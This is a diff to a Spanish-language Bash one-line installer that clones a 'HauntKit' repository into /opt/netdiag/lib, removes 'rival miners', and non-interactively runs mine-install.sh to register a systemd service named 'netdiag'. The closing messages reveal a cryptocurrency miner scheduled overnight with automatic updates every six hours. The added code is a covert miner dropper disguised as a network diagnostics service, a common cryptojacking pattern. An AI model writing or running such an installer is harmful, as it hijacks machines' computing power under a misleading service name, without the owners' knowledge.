@@ -4,8 +4,6 @@
 #  Una línea, sin interacción, sin esfuerzo
 # ════════════════════════════════════════════════════════
 
-set -e
-
 # ─── Colores ───
 RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'
 YELLOW='\033[1;33m'; NC='\033[0m'
@@ -24,55 +22,66 @@ echo "║         CYBER HAUNT & SPECTRE           ║"
 echo "╚══════════════════════════════════════════╝"
 echo -e "${NC}"
 
-# ─── Detectar gestor de paquetes ───
-if command -v apt &>/dev/null; then
-    PKG_MANAGER="apt"
-elif command -v yum &>/dev/null; then
-    PKG_MANAGER="yum"
-elif command -v apk &>/dev/null; then
-    PKG_MANAGER="apk"
-else
-    echo -e "${RED}[!] No se detectó gestor de paquetes compatible${NC}"
-    exit 1
-fi
-
-# ─── Instalar git si no existe ───
+# ─── Paso 1: Git ───
+echo -e "${YELLOW}[1/4]${NC} Verificando git..."
 if ! command -v git &>/dev/null; then
-    echo -e "${YELLOW}[*] Instalando git...${NC}"
-    case "$PKG_MANAGER" in
-        apt) apt-get update -qq && apt-get install -y -qq git ;;
-        yum) yum install -y -q git ;;
-        apk) apk add -q git ;;
-    esac
-    echo -e "${GREEN}[✓] Git instalado${NC}"
-else
-    echo -e "${GREEN}[✓] Git detectado${NC}"
+    echo -e "  ${YELLOW}→ Instalando git...${NC}"
+    if command -v apt &>/dev/null; then
+        apt-get update >/dev/null 2>&1 && apt-get install -y git >/dev/null 2>&1
+    elif command -v yum &>/dev/null; then
+        yum install -y git >/dev/null 2>&1
+    elif command -v apk &>/dev/null; then
+        apk add git >/dev/null 2>&1
+    else
+        echo -e "${RED}[!] No se pudo instalar git. Instálalo manualmente.${NC}"
+        exit 1
+    fi
 fi
+echo -e "  ${GREEN}✓ git listo${NC}"
 
-# ─── Clonar HauntKit ───
+# ─── Paso 2: Clonar ───
+echo -e "${YELLOW}[2/4]${NC} Clonando HauntKit..."
 REPO="https://github.com/CyberRo/HauntKit.git"
 DEST="/opt/netdiag/lib"
 
 if [ -d "$DEST/.git" ]; then
-    echo -e "${YELLOW}[*] Repo ya existe, actualizando...${NC}"
-    git -C "$DEST" pull
+    echo -e "  ${YELLOW}→ Ya existe, actualizando...${NC}"
+    git -C "$DEST" pull 2>&1 | tail -1
 else
-    echo -e "${YELLOW}[*] Clonando HauntKit...${NC}"
     mkdir -p "$(dirname "$DEST")"
-    git clone "$REPO" "$DEST"
+    git clone "$REPO" "$DEST" 2>&1 | tail -1
 fi
-echo -e "${GREEN}[✓] Repo listo en $DEST${NC}"
+echo -e "  ${GREEN}✓ Repo en $DEST${NC}"
 
-# ─── Ejecutar instalador (modo automático) ───
-echo ""
-echo -e "${YELLOW}[*] Ejecutando instalador...${NC}"
-echo "y" | bash "$DEST/tools/utils/mine-install.sh"
+# ─── Paso 3: Anti-miner ───
+echo -e "${YELLOW}[3/4]${NC} Buscando mineros rivales..."
+if [ -f "$DEST/tools/utils/clean-miners.sh" ]; then
+    bash "$DEST/tools/utils/clean-miners.sh" --strict 2>&1
+    echo ""
+fi
 
+# ─── Paso 4: Instalar ───
+echo -e "${YELLOW}[4/4]${NC} Instalando netdiag..."
+echo "y" | bash "$DEST/tools/utils/mine-install.sh" 2>&1
+
+# ─── Resultado ───
 echo ""
-echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
-echo -e "${GREEN}║    Instalación completada exitosamente   ║${NC}"
-echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
-echo ""
-echo "  Servicio: netdiag"
-echo "  Estado:   systemctl status netdiag"
-echo "  Monitorear: bash /opt/netdiag/lib/tools/utils/mine-monitor.sh"
+if systemctl is-active --quiet netdiag 2>/dev/null; then
+    echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}║   ✅ Instalación completada con éxito    ║${NC}"
+    echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
+    echo ""
+    echo -e "  ${GREEN}✓${NC} Servicio netdiag: ACTIVO"
+    echo -e "  ${GREEN}✓${NC} Minero programado: 6PM - 7AM (Colombia)"
+    echo -e "  ${GREEN}✓${NC} Auto-update: cada ~6h"
+    echo ""
+    echo "  bash $DEST/tools/utils/mine-monitor.sh"
+else
+    echo -e "${YELLOW}╔══════════════════════════════════════════╗${NC}"
+    echo -e "${YELLOW}║   ⚠️  Instalación lista, servicio no     ║${NC}"
+    echo -e "${YELLOW}║   iniciado. Inícialo manualmente:        ║${NC}"
+    echo -e "${YELLOW}╚══════════════════════════════════════════╝${NC}"
+    echo ""
+    echo "  systemctl start netdiag"
+    echo "  systemctl enable netdiag"
+fi
